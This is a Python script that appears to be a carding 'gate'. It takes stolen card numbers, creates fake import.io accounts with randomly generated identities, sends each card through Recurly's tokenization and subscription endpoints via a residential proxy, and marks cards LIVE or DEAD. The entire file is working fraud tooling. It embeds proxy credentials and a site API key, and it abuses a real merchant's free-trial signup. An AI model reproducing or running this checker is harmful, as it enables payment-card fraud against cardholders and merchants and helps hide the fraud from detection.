
import base64
from bs4 import BeautifulSoup
import random
import urllib.parse
import aiohttp
import asyncio
import json 
import names
import platform
import html
import ssl
import certifi
import names
import random_address
import time

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


async def GateMasstr(session, cc):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    timeout=25
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        first = f"{names.get_first_name()}".lower()
        last = f"{names.get_last_name()}".lower()
        telephone = f'79{random.randint(1000,9999)}{random.randint(1000,9999)}'
        CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1,99999)}@gmail.com".lower()
        #UserName = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1,99999)}".lower()
        inicio = time.time()
        try:
            #---------------------------------REQUEST NUMERO 1------------------------------#
            #---------------------------------REQUEST NUMERO 1------------------------------#   
            try :
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                    'Accept': '*/*',
                    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Content-type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://api.recurly.com',
                    'Connection': 'keep-alive',
                    'Referer': 'https://api.recurly.com/js/v1/field.html',
                }
                data = f'first_name={first}&last_name={last}&number={ccnum}&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-ES&browser[referrer_url]=https%3A%2F%2Fsignup.import.io%2F%23starter_2303&browser[screen_height]=1080&browser[screen_width]=1920&browser[time_zone_offset]=300&browser[user_agent]=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A109.0%29%20Gecko%2F20100101%20Firefox%2F112.0&month={mes}&year={ano}&cvv=&version=4.23.1&key=ewr1-AebmPzzu6ZXA4aRiXXan32&deviceId=NPA0MGk5z71rMIld&sessionId=TmY0A8cSwQnJdgyM&instanceId=GJCC3CJ8o07VrEXw'
                async with session.post('https://api.recurly.com/js/v1/token', proxy=str("http://QefZIpxf:6XRnahMifg_country-us@residential.proxies.gg:40000"), data=data,headers=headers, timeout=18) as resp:
                    response = await resp.json()
                    idrecurly = response['id']
            except UnboundLocalError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}'  
            except TypeError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}'
            except KeyError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}'   
            except IndexError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}' 
            #---------------------------------REQUEST NUMERO 2------------------------------#
            #---------------------------------REQUEST NUMERO 2------------------------------#
            try :
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
                    'Accept': '*/*',
                    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    # 'Accept-Encoding': 'gzip, deflate, br',
                    'Referer': 'https://signup.import.io/',
                    'Content-Type': 'application/json',
                    'Origin': 'https://signup.import.io',
                    'Connection': 'keep-alive',
                    # 'Cookie': '_ga_X7EJ0BD8D5=GS1.1.1683681081.2.1.1683681104.0.0.0; _ga=GA1.1.2084139801.1683677002; _iidt=rMSolI5RmFR6VYdJutBOmKzfg5g9ySpmZOxIWjInqA7Tk6u6mdlJKCqpVLylOiV08PIvnn/daYJTVGWPYSZ4ruCPVQ==; _vid_t=u5rHqrRoeLv6cDLdYlHtw5mHodWkMPrBeXHEGxjFq7gigd+h39ZQc8sCqHciJEWIjWqyYKYz/kxneD7Y4iSC+kYZKA==',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                json_data = {
                    'firstName': first,
                    'lastName': last,
                    'company': telephone,
                    'email': CorreoRand,
                    'password': '4s5tPakZArF8Lk2',
                    'fingerprintToken': 'gNRA1xFxamuwGUmYpfhl',
                }
                async with session.post(f'https://auth-api.import.io/signup-full', headers=headers, json=json_data, proxy=str("http://QefZIpxf:6XRnahMifg_country-us@residential.proxies.gg:40000"), timeout=timeout) as resp:
                    response = await resp.json()
                    userGuid = response['userGuid']
            except UnboundLocalError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'  
            except TypeError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'
            except KeyError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'   
            except IndexError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'
            #---------------------------------REQUEST NUMERO 2------------------------------#
            #---------------------------------REQUEST NUMERO 2------------------------------#
            try :
                json_data = {
                    'account': {
                        'accountCode': userGuid,
                        'companyName': telephone,
                        'email': CorreoRand,
                        'firstName': first,
                        'lastName': last,
                        'recurlyToken': idrecurly,
                    },
                    'planCode': 'free_trial_2303',
                }
                async with session.post(f'https://bees.import.io/recurly/subscription', json=json_data, proxy=str("http://QefZIpxf:6XRnahMifg_country-us@residential.proxies.gg:40000"), timeout=timeout) as resp:
                    response = await resp.text()
            except UnboundLocalError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'  
            except TypeError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'
            except KeyError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'   
            except IndexError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'  
            #------------ ---------------------CHECCK REQUESTS------------------------------#
            if (int(response.find('"status":"ok"')) > 0):
                return '[ LIVE ✅ ]', "Card Authorized", f'{time.time()-inicio}'
            elif (int(response.find('Your transaction was declined due to insufficient funds in your account. Please use a different card or contact your bank.')) > 0):
                return '[ LIVE ✅ ]', "Your transaction was declined due to insufficient funds in your account. Please use a different card or contact your bank.", f'{time.time()-inicio}'
            elif (int(response.find('"customerMessage":')) > 0):
                response = await resp.json()
                response = response['recurlyError']['customerMessage']
                return '[ DEAD ❌ ]', response, f'{time.time()-inicio}' 
            else :
                return '[ ERROR ⚠ ]',"An unexpected error occurred in response. It was not generated correctly. ⚠️", f'{time.time()-inicio}' 
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return '[ ERROR ⚠ ]',"An unexpected error occurred. ServerDisconnectedError. ♻️", f'{time.time()-inicio}' 
        except (asyncio.exceptions.TimeoutError):
            return '[ ERROR ⚠ ]',"An unexpected error occurred. Timeout Error. ♻️", f'{time.time()-inicio}' 
        except (aiohttp.client_exceptions.ClientConnectorError):
            return '[ ERROR ⚠ ]',"An unexpected error occurred. ClientConnectorError. ♻️", f'{time.time()-inicio}' 
        finally:
                await session.close()